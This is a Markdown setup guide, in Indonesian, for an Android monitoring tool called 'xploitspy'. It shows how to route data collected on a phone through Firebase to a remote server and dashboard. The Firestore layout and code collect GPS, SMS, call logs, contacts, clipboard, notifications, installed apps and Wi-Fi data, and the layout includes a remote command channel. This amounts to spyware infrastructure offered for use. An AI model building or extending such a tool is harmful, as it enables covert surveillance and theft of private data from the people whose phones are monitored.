# Integrasi Firebase - Monitoring Cross-Network

## Overview

Dengan Firebase, device Android bisa dikirim data dari jaringan manapun, dan server bisa membaca data tersebut. Ini memecahkan masalah koneksi cross-network.

## Setup Firebase

### 1. Buat Firebase Project

1. Buka https://console.firebase.google.com/
2. Klik "Add project"
3. Nama project: `xploitspy` (atau nama lain)
4. Enable Google Analytics (opsional)
5. Create project

### 2. Setup Firestore Database

1. Di Firebase Console → Firestore Database
2. Create database
3. Start in **test mode** (untuk development)
4. Pilih location terdekat
5. Enable

### 3. Setup Android App

1. Firebase Console → Project Settings → Add app → Android
2. Package name: `com.xploitspy.client`
3. Download `google-services.json`
4. Copy ke: `client/app/google-services.json`

### 4. Setup Server

1. Firebase Console → Project Settings → Service Accounts
2. Generate new private key
3. Download JSON file
4. Simpan sebagai: `server/firebase-service-account.json`

## Install Dependencies

### Server

```bash
cd server
npm install firebase-admin
```

### Android Client

Dependencies sudah ditambahkan di `build.gradle`. Pastikan:
- File `google-services.json` ada di `client/app/`
- Plugin `com.google.gms.google-services` sudah ditambahkan

## Update Code

### Android Client

File `FirebaseManager.java` sudah dibuat. Update `DataManager.java` untuk menggunakan Firebase:

```java
// Di DataManager.java, tambahkan:
private FirebaseManager firebaseManager;

// Di constructor:
firebaseManager = new FirebaseManager(context);
firebaseManager.registerDevice(android.os.Build.MODEL, android.os.Build.VERSION.RELEASE);

// Di setiap collect method, tambahkan:
firebaseManager.sendGps(latitude, longitude, accuracy, altitude);
```

### Server

File `firebase.js` sudah dibuat. Server akan otomatis sync data dari Firestore ke SQLite.

## Testing

1. **Setup Firebase** (ikuti langkah di atas)
2. **Install dependencies:**
   ```bash
   cd server && npm install
   cd ../client && ./gradlew assembleDebug
   ```
3. **Install APK** ke device
4. **Buka aplikasi** - data akan otomatis dikirim ke Firebase
5. **Cek Firebase Console** - data akan muncul di Firestore
6. **Cek Dashboard** - server akan sync data dari Firebase

## Struktur Firestore

```
/devices/{deviceId}/
  ├── deviceInfo (deviceName, androidVersion, lastSeen)
  ├── gps_logs/{timestamp}
  ├── sms_logs/{timestamp}
  ├── call_logs/{timestamp}
  ├── contacts/{contactId}
  ├── apps/{packageName}
  ├── clipboard/{timestamp}
  ├── notifications/{timestamp}
  ├── wifi/{timestamp}
  └── commands/{commandId}
```

## Keuntungan

✅ **Cross-Network**: Device bisa di-monitoring dari jaringan manapun
✅ **Real-time**: Firestore real-time sync
✅ **Reliable**: Firebase handle connection issues
✅ **Scalable**: Bisa handle banyak device
✅ **Offline Support**: Firebase cache data saat offline

## Security Rules (Production)

Setup Firestore Security Rules untuk production:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /devices/{deviceId}/{document=**} {
      allow read, write: if request.auth != null;
    }
  }
}
```

## Catatan

- Firebase free tier cukup untuk development
- Untuk production, pertimbangkan Firebase pricing
- Setup authentication untuk security
- Monitor Firebase usage di console

